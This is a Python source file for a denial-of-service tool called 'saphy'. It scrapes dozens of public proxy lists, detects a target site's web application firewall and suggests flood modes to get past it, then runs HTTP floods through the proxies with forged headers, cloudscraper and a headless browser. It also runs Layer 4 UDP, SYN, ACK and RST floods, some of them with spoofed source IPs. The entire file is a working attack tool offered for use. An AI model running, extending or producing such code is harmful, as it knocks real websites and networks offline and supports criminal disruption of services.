# saphy V2.5
# Developed by: LYNSS
import threading
import asyncio
import aiohttp
import aiohttp_socks
import random
import time
import os
import socket
import cloudscraper
import requests
import json
import re
import scapy
import pyppeteer
import tls_client
from pyppeteer import launch
from scapy.all import IP, TCP, UDP, ICMP, send
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from colorama import Fore, Style, init
from aiohttp_socks import ProxyConnector
from cloudscraper import create_scraper

def fake_ip():
    return '.'.join(str(random.randint(1, 254)) for _ in range(4))

def fake_headers(base_url, user_agents):
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": base_url,
        "X-Bot-ID": str(random.randint(1000, 9999)),
        "X-Forwarded-For": fake_ip(),
        "Via": "1.1 proxy-bot"
    }

def categorize_proxies(proxy_list):
    http, socks4, socks5 = [], [], []
    for proxy in proxy_list:
        if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", proxy):
            if "socks4" in proxy.lower():
                socks4.append(proxy.replace("socks4://", ""))
            elif "socks5" in proxy.lower():
                socks5.append(proxy.replace("socks5://", ""))
            else:
                http.append(proxy.replace("http://", ""))
    return http, socks4, socks5

def geo_ip(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = res.json()
        return f"{data.get('country', 'N/A')} ({data.get('city', 'N/A')})"
    except:
        return "Unknown"

def get_connector(proxy, proxy_type):
    if proxy_type == "http":
        return aiohttp.TCPConnector(ssl=False)
    elif proxy_type == "socks4":
        return ProxyConnector.from_url(f"socks4://{proxy}")
    elif proxy_type == "socks5":
        return ProxyConnector.from_url(f"socks5://{proxy}")
    else:
        return None
    
WAF_SIGNATURES = {
    "cloudflare": ["cloudflare", "__cfduid", "__cf_bm"],
    "sucuri": ["sucuri", "sucuri_cloudproxy_js"],
    "akamai": ["akamai", "akamaiGHost", "akamai-bot"],
    "imperva": ["incapsula", "x-iinfo", "visid_incap_"],
    "f5": ["bigip", "x-waf", "x-cdn", "F5 Networks"],
    "barracuda": ["barra_counter_session", "barracuda"],
    "aws": ["awselb", "x-amzn", "AWSALB", "AWSALBCORS"],
    "doseray": ["ray_id", "cf-ray"],
    "bluedon": ["bd_sec_ver", "bluedon"],
    "stackpath": ["stackpath", "sp_request_guid"]
}
    

# Initialize colorama
init(autoreset=True)

# Load user agents
def load_user_agents():
    with open('useragents.txt', 'r') as f:
        return [line.strip() for line in f if line.strip()]

# Proxy Scraper 
def scrape_proxies():
    proxy_sources = [
        "https://www.proxy-list.download/api/v1/get?type=socks4",
        "https://www.proxy-list.download/api/v1/get?type=socks5",
        "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxies.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
        "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
        "https://proxyspace.pro/socks5.txt",
        "https://proxyspace.pro/http.txt",
        "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
        "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
        "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
        "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys/main/cnfree.txt",
        "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/all.txt",
        "https://raw.githubusercontent.com/yuceltoluyag/Free-Proxy-List/main/proxies/proxy-list.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
        "https://github.com/TheSpeedX/PROXY-List/raw/master/http.txt",
        "https://geonode.com/free-proxy-list",
        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/proxies.txt",
        "https://github.com/jetkai/proxy-list/raw/main/online-proxies/txt/proxies-http.txt",
        "https://free-proxy-list.net/",
        "https://github.com/oxylabs/free-proxy-list/raw/main/proxy.txt",
        "https://spys.me/proxy.txt",
        "https://proxyelite.info/files/proxy/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/txt/proxies-socks4.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/txt/proxies-socks5.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies_anonymous.txt",
        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/socks4.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/casals-ar/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks4.txt",
        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/https.txt",
        "https://raw.githubusercontent.com/malbink/Free-Proxy-List/master/proxies.txt",
        "https://raw.githubusercontent.com/aniyun009/free-proxy-list/main/proxy-list.txt",
        "https://raw.githubusercontent.com/andybalholm/aaa-proxy-list/main/list.txt",
        "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/https.txt",
        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/proxies.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
        "https://raw.githubusercontent.com/hanwaytech/free-proxy-list/main/proxy-list.txt",
        "https://raw.githubusercontent.com/Bardiafa/Proxy-Leecher/main/output.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/https.txt",
        "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list_anonymous.txt",
        "https://raw.githubusercontent.com/Jiejiejiayou/IPTVProxy/main/proxy/http.txt",
        "https://raw.githubusercontent.com/Jiejiejiayou/IPTVProxy/main/proxy/socks5.txt"
    ]
    proxies = set()
    print(f"{Fore.YELLOW}[!] Scraping fresh proxies...")
    for url in proxy_sources:
        try:
            r = requests.get(url, timeout=10)
            for line in r.text.splitlines():
                proxy = line.strip()
                if proxy:
                    proxies.add(proxy)
        except Exception as e:
            print(f"{Fore.RED}[!] Failed scraping {url}: {e}")
    print(f"{Fore.GREEN}[+] Scraped {len(proxies)} proxies!\n")
    return list(proxies)


# Analyze target info
def analyze_target(url):
    print(f"{Fore.CYAN}[i] Analyzing target...")
    info = {
        "server": "Unknown",
        "powered_by": "Unknown",
        "cloudflare": False,
        "content_type": "Unknown",
        "content_length": 0,
        "connection": "Unknown"
    }
    try:
        response = requests.get(url, timeout=10)
        body = response.text
        detected_wafs = detect_waf(response.headers, body)
        info["waf"] = detected_wafs
        info["server"] = response.headers.get('Server', 'Unknown')
        info["powered_by"] = response.headers.get('X-Powered-By', 'Unknown')
        info["content_type"] = response.headers.get('Content-Type', 'Unknown')
        info["content_length"] = int(response.headers.get('Content-Length', 0) or 0)
        info["connection"] = response.headers.get('Connection', 'Unknown')
        info["cloudflare"] = 'cloudflare' in detected_wafs

        print(f"{Fore.LIGHTMAGENTA_EX}[~] WAF Detected  : {', '.join(detected_wafs) if detected_wafs else 'None'}") 
        print(f"{Fore.LIGHTMAGENTA_EX}[~] Status Code: {response.status_code}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] Server: {info['server']}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] X-Powered-By: {info['powered_by']}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] Content-Type: {info['content_type']}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] Content-Length: {info['content_length']}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] Connection: {info['connection']}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] Behind Cloudflare: {'Yes' if info['cloudflare'] else 'No'}\n")
        if response.status_code != 200:
            print(f"{Fore.RED}[!] Warning: Target may be DOWN or BLOCKED!\n")
    except Exception as e:
        print(f"{Fore.RED}[!] Target analysis failed: {e}\n")
    return info

def detect_waf(headers, body):
    detected = []
    all_headers = ' '.join(f"{k}: {v}" for k, v in headers.items()).lower()
    body_lower = body.lower() if isinstance(body, str) else ""

    for waf, signatures in WAF_SIGNATURES.items():
        for sig in signatures:
            if sig.lower() in all_headers or sig.lower() in body_lower:
                detected.append(waf.capitalize())
                break

    return list(set(detected))

# Suggest attack modes
def suggest_attack_modes(info):
    suggestions = []
    content_type = info.get('content_type', '').lower()
    connection = info.get('connection', '').lower()
    wafs = info.get('waf', [])

    # WAF-specific logic
    for waf in wafs:
        waf = waf.lower()
        if waf == "cloudflare":
            suggestions += ["random-method", "referer", "cookie", "headless"]
        elif waf == "akamai":
            suggestions += ["post", "cache-bypass"]
        elif waf == "imperva":
            suggestions += ["random-uri", "head", "useragent"]
        elif waf == "sucuri":
            suggestions += ["random-uri", "referer"]
        elif waf == "aws":
            suggestions += ["cookie", "useragent"]
        elif waf == "f5":
            suggestions += ["head", "cache-bypass"]
        elif waf == "barracuda":
            suggestions += ["post", "referer", "cache-bypass"]
        elif waf == "stackpath":
            suggestions += ["random-method", "referer"]

    # Content-type based logic
    if 'html' in content_type:
        suggestions += ["http-flood", "random-uri"]
    if 'json' in content_type:
        suggestions += ["post"]
    if 'keep-alive' in connection:
        suggestions += ["cookie"]
    if info.get('content_length', 0) > 500000:
        suggestions += ["cache-bypass"]
    if 'json' in content_type:
        suggestions += ["json-post", "graphql"]
    if 'aws' in [w.lower() for w in wafs] or 'akamai' in [w.lower() for w in wafs]:
        suggestions += ["json-post", "graphql"]

    # De-duplicate while preserving order
    seen = set()
    final_suggestions = []
    for mode in suggestions:
        if mode not in seen:
            seen.add(mode)
            final_suggestions.append(mode)

    return final_suggestions

# Global counters
counters = {
    "total": 0,
    "success": 0,
    "error": 0
}
lock = threading.Lock()

# Header Generator
def generate_headers(url, user_agents, mode="basic"):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": url
    }
    if mode == "cookie":
        headers["Cookie"] = f"session={random.randint(100000, 999999)}"
    elif mode == "referer":
        headers["Referer"] = random.choice([
            "https://google.com", "https://bing.com",
            "https://facebook.com", "https://tiktok.com"
        ])
    elif mode == "cache":
        headers["Cache-Control"] = "no-cache"
    elif mode == "json":
        headers["Content-Type"] = "application/json"
    elif mode == "graphql":
        headers["Content-Type"] = "application/json"
        headers["X-GraphQL-Query"] = "enabled"
    return headers

# Async attack
async def generic_attack(url, duration, user_agents, proxy, proxy_type, method="GET", uri_random=False, data=None, header_mode="basic", random_method=False):
    end_time = time.time() + duration
    timeout = aiohttp.ClientTimeout(total=10)

    connector = get_connector(proxy, proxy_type)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while time.time() < end_time:
            try:
                path = f"?id={random.randint(1, 999999)}" if uri_random else ""
                headers = fake_headers(url, user_agents)
                use_method = method if not random_method else random.choice(["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"])

                async with session.request(
                    method=use_method,
                    url=url + path,
                    headers=headers
                ) as response:
                    await response.read()

                with lock:
                    counters["total"] += 1
                    counters["success"] += 1
            except:
                with lock:
                    counters["total"] += 1
                    counters["error"] += 1

async def headless_browser_attack(url, duration):
    end_time = time.time() + duration
    browser = await launch(
        headless=True,
        args=[
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--window-size=1920,1080'
        ]
    )
    page = await browser.newPage()

    while time.time() < end_time:
        try:
            await page.setUserAgent(random.choice(load_user_agents()))
            await page.goto(url, timeout=10000)
            await asyncio.sleep(random.uniform(0.5, 2))  # simulate human delay

            with lock:
                counters["total"] += 1
                counters["success"] += 1
        except Exception as e:
            with lock:
                counters["total"] += 1
                counters["error"] += 1

    await browser.close()

# Cloudflare bypass
def cloudflare_bypass(url, duration, user_agents):
    scraper = cloudscraper.create_scraper(
        browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
    )
    
    end_time = time.time() + duration

    while time.time() < end_time:
        headers = {
            "User-Agent": random.choice(user_agents),
            "Referer": random.choice([
                "https://google.com", "https://bing.com", "https://yahoo.com",
                "https://facebook.com", "https://twitter.com", "https://instagram.com",
                "https://tiktok.com", "https://reddit.com",
                "https://github.com", "https://stackoverflow.com",

            ]),
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache"
        }

        try:
            response = scraper.get(url, headers=headers, timeout=10)

            # Cloudflare challenge detection
            if "cf-chl-bypass" in response.text or "Attention Required" in response.text:
                raise Exception("Cloudflare challenge page detected")

            with lock:
                counters["total"] += 1
                counters["success"] += 1
        except Exception:
            with lock:
                counters["total"] += 1
                counters["error"] += 1
        
        time.sleep(random.uniform(0.8, 2.5))

# Stats Dashboard
def stats_dashboard(url, duration):
    start = time.time()
    end_time = start + duration
    prev_total = 0
    while time.time() < end_time:
        time.sleep(1)
        with lock:
            total = counters["total"]
            success = counters["success"]
            error = counters["error"]
        rps = total - prev_total
        prev_total = total

        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.LIGHTYELLOW_EX}=== Attack Dashboard ==={Style.RESET_ALL}")
        print(f"{Fore.LIGHTCYAN_EX}Target        : {url}")
        print(f"{Fore.LIGHTCYAN_EX}Time Left     : {int(end_time - time.time())}s")
        print(f"{Fore.LIGHTCYAN_EX}Total Requests: {total}")
        print(f"{Fore.LIGHTGREEN_EX}Successful    : {success}")
        print(f"{Fore.LIGHTRED_EX}Errors        : {error}")
        print(f"{Fore.LIGHTMAGENTA_EX}Current RPS   : {rps}\n")

# ======= Layer 4 Class =======

class Layer4Attack:
    def __init__(self, target_ip, target_port, duration, threads):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.end_time = time.time() + duration

    def udp_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(random.randint(32, 1024))
                sock.sendto(payload, (self.target_ip, self.target_port))
                sock.close()
            except:
                pass

    def tcp_syn_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((self.target_ip, self.target_port))
                sock.send(random._urandom(16))
                sock.close()
            except:
                pass

    def tcp_ack_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((self.target_ip, self.target_port))
                sock.send(b'\x10\x02' + random._urandom(14))
                sock.close()
            except:
                pass

    def raw_syn_flood(self):
        while time.time() < self.end_time:
            ip = IP(src=fake_ip(), dst=self.target_ip)
            tcp = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags='S')
            packet = ip / tcp
            send(packet, verbose=False)
    

    def protocol_blender_flood(self):
        while time.time() < self.end_time:
            ip = IP(src=fake_ip(), dst=self.target_ip)
            proto = random.choice(['tcp', 'udp', 'icmp'])
        if proto == 'tcp':
            layer = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags='S')
        elif proto == 'udp':
            layer = UDP(sport=random.randint(1024,65535), dport=self.target_port)
        else:
            layer = ICMP()
        packet = ip / layer
        send(packet, verbose=False)

    def slow_connect_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                sock.send(b"GET / HTTP/1.1\r\n")
                time.sleep(random.uniform(0.5, 1.5))
            except:
                pass

    def fragmentation_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_ip, self.target_port))
                for _ in range(20):  # Fragmented small chunks
                    sock.send(random._urandom(4))
                    time.sleep(0.05)
                sock.close()
            except:
                pass

    def tcp_rst_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((self.target_ip, self.target_port))
                sock.send(b'\x00\x02' + random._urandom(14))
                sock.close()
            except:
                pass

    def hybrid_l4_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((self.target_ip, self.target_port))
                flags = random.choice([b'\x02', b'\x10', b'\x04', b'\x08', b'\x01'])
                sock.send(flags + random._urandom(15))
                sock.close()
            except:
                pass

    def start_attack(self, mode):
        attack_map = {
            "udp-flood": self.udp_flood,
            "tcp-syn-flood": self.tcp_syn_flood,
            "tcp-ack-flood": self.tcp_ack_flood,
            "syn-spoof": self.raw_syn_flood,
            "tcp-rst-flood": self.tcp_rst_flood,
            "hybrid-l4": self.hybrid_l4_flood,
            "proto-blender": self.protocol_blender_flood,
            "slow-connect": self.slow_connect_flood,
            "fragment-flood": self.fragmentation_flood
        }
        attack_func = attack_map.get(mode)
        if not attack_func:
            print(f"{Fore.RED}[!] Invalid attack mode.")
            return
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=attack_func, daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

# Main
async def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Fore.LIGHTYELLOW_EX}
███████╗ █████╗ ██████╗ ██╗  ██╗██╗   ██╗    
██╔════╝██╔══██╗██╔══██╗██║  ██║╚██╗ ██╔╝    
███████╗███████║██████╔╝███████║ ╚████╔╝     
╚════██║██╔══██║██╔═══╝ ██╔══██║  ╚██╔╝      
███████║██║  ██║██║     ██║  ██║   ██║       
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝       
{Style.RESET_ALL}
         {Fore.LIGHTYELLOW_EX}Saphy{Style.RESET_ALL} Saphy v1.0 - Firepower Edition
{Fore.LIGHTCYAN_EX}  Developed By: Lynss
{Style.RESET_ALL}
    """)
    print(f"{Fore.LIGHTGREEN_EX}Choose Layer: ")
    print(f"{Fore.YELLOW}1. Layer 7 (Website)")
    print(f"{Fore.YELLOW}2. Layer 4 (Network/IP)")
    layer_choice = int(input(f"{Fore.LIGHTGREEN_EX}Enter choice > "))

    if layer_choice == 1:
        url = input(f"{Fore.LIGHTGREEN_EX}Target URL > ")
        info = analyze_target(url)
        duration = int(input(f"{Fore.LIGHTGREEN_EX}Attack Duration (seconds) > "))
        threads = int(input(f"{Fore.LIGHTGREEN_EX}Threads > "))

        attack_modes = {
            "http-flood": {"method": "GET"},
            "random-uri": {"method": "GET", "uri_random": True},
            "head": {"method": "HEAD"},
            "post": {"method": "POST"},
            "random-method": {"random_method": True, "uri_random": True},
            "cookie": {"method": "GET", "header_mode": "cookie"},
            "referer": {"method": "GET", "header_mode": "referer"},
            "useragent": {"method": "GET"},
            "cache-bypass": {"method": "GET", "header_mode": "cache", "uri_random": True},
            "headless": {"headless": True},
            "graphql": {
            "method": "POST",
            "data": json.dumps({"query": "{__typename}"}),
            "header_mode": "graphql"
                },
            "json-post": {
                "method": "POST",
                "data": json.dumps({"username": "admin", "password": "123456"}),
                "header_mode": "json"
            }
        }

        # Smart Suggestion
        suggested_modes = suggest_attack_modes(info)

        print(f"{Fore.LIGHTGREEN_EX}Select Attack Mode:")
        for i, mode in enumerate(attack_modes.keys(), 1):
            hint = f"[suggested]" if mode in suggested_modes else ""
            print(f"{Fore.YELLOW}{i}. {mode} {Fore.LIGHTMAGENTA_EX}{hint}")

        mode_choices = input(f"{Fore.LIGHTGREEN_EX}Enter choices (e.g. 1,3,5) > ")
        selected_indices = [int(i.strip()) - 1 for i in mode_choices.split(',') if i.strip().isdigit()]
        selected_modes = [list(attack_modes.keys())[i] for i in selected_indices if 0 <= i < len(attack_modes)]

        if len(selected_modes) > 5:
            print(f"{Fore.RED}[!] Too many modes selected. Max 5 allowed.")
            return

        print(f"{Fore.LIGHTCYAN_EX}Selected Modes : {', '.join(selected_modes)}\n")

        user_agents = load_user_agents()
        
        http_proxies, socks4_proxies, socks5_proxies = categorize_proxies(scrape_proxies())
        selected_type = "http"  

        if selected_type == "http":
            proxy_list = http_proxies
        elif selected_type == "socks4":
            proxy_list = socks4_proxies
        elif selected_type == "socks5":
            proxy_list = socks5_proxies
        elif selected_type == "tor":
            proxy_list = ["127.0.0.1:9050"] * 50  
            selected_type = "socks5"

        threading.Thread(target=stats_dashboard, args=(url, duration), daemon=True).start()

        if info['cloudflare']:
            threads_list = [threading.Thread(target=cloudflare_bypass, args=(url, duration, user_agents), daemon=True) for _ in range(threads)]
            for t in threads_list: t.start()
            for t in threads_list: t.join()
        else:
            tasks = []

        for selected_mode in selected_modes:
            config = attack_modes[selected_mode]

            if "headless" in config:
                print(f"{Fore.LIGHTBLUE_EX}[i] Launching Headless Browser Attack...")
                await headless_browser_attack(url, duration)
                continue

            if info['cloudflare']:
                threads_list = [
                    threading.Thread(target=cloudflare_bypass, args=(url, duration, user_agents), daemon=True)
                    for _ in range(threads)
                ]
                for t in threads_list: t.start()
                for t in threads_list: t.join()
            elif "headless" in config:
                await headless_browser_attack(url, duration)
            else:
                for proxy in proxy_list:
                    tasks.append(generic_attack(
                        url=url,
                        duration=duration,
                        user_agents=user_agents,
                        proxy=proxy,
                        proxy_type=selected_type,
                        method=config.get("method", "GET"),
                        uri_random=config.get("uri_random", False),
                        data=config.get("data", None),
                        header_mode=config.get("header_mode", "basic"),
                        random_method=config.get("random_method", False)
                    ))
            await asyncio.gather(*tasks)

        print(f"{Fore.YELLOW}[i] Launching {len(tasks)} attack tasks across {len(proxy_list)} proxies and {len(selected_modes)} mode(s).")

        await asyncio.gather(*tasks)

    print(f"\n{Fore.GREEN}[+] Attack finished! Total: {counters['total']}, Success: {counters['success']}, Errors: {counters['error']}")

    if layer_choice == 2:
        print(f"{Fore.LIGHTGREEN_EX}{'='*40}")
        print(f"{Fore.LIGHTGREEN_EX}        Layer 4 Attack Dashboard")
        print(f"{Fore.LIGHTGREEN_EX}{'='*40}")

        target_ip = input(f"{Fore.LIGHTGREEN_EX}Target IP > ")
        target_port = int(input(f"{Fore.LIGHTGREEN_EX}Target Port > "))
        duration = int(input(f"{Fore.LIGHTGREEN_EX}Attack Duration (seconds) > "))
        threads = int(input(f"{Fore.LIGHTGREEN_EX}Threads > "))

        print(f"{Fore.LIGHTGREEN_EX}Select Layer 4 Attack Mode:")
        print(f"{Fore.YELLOW}1. UDP Flood")
        print(f"{Fore.YELLOW}2. TCP SYN Flood")
        print(f"{Fore.YELLOW}3. TCP ACK Flood")
        print(f"{Fore.YELLOW}4. SYN Spoof")
        print(f"{Fore.YELLOW}5. TCP RST Flood")
        print(f"{Fore.YELLOW}6. Hybrid L4 Flood")
        print(f"{Fore.YELLOW}7. PROTO-BLENDER Flood")
        print(f"{Fore.YELLOW}8. SLOW-CONNECT Flood")
        print(f"{Fore.YELLOW}8. FRAGMENTED Flood")
        mode_choice = int(input(f"{Fore.LIGHTGREEN_EX}Enter choice > "))

        mode_map = {
            1: "udp-flood",
            2: "tcp-syn-flood",
            3: "tcp-ack-flood",
            4: "syn-spoof",
            5: "tcp-rst-flood",
            6: "hybrid-l4",
            7: "proto-blender",
            8: "slow-connect",
            9: "fragment-flood"
        }

        mode = mode_map.get(mode_choice)

        if mode:
            # Dashboard summary
            print(f"\n{Fore.LIGHTCYAN_EX}{'-'*40}")
            print(f"{Fore.CYAN}Target IP      : {target_ip}")
            print(f"{Fore.CYAN}Target Port    : {target_port}")
            print(f"{Fore.CYAN}Duration       : {duration} seconds")
            print(f"{Fore.CYAN}Threads        : {threads}")
            print(f"{Fore.CYAN}Attack Mode    : {mode}")
            print(f"{Fore.LIGHTCYAN_EX}{'-'*40}")

            confirm = input(f"{Fore.LIGHTGREEN_EX}Confirm and launch attack? (Y/n) > ").strip().lower()
            if confirm == 'y' or confirm == '':
                attack = Layer4Attack(target_ip, target_port, duration, threads)
                attack.start_attack(mode)
            else:
                print(f"{Fore.LIGHTYELLOW_EX}Attack canceled by user.")
        else:
            print(f"{Fore.RED}[!] Invalid choice!")

# Run Main
if __name__ == "__main__":
    asyncio.run(main())
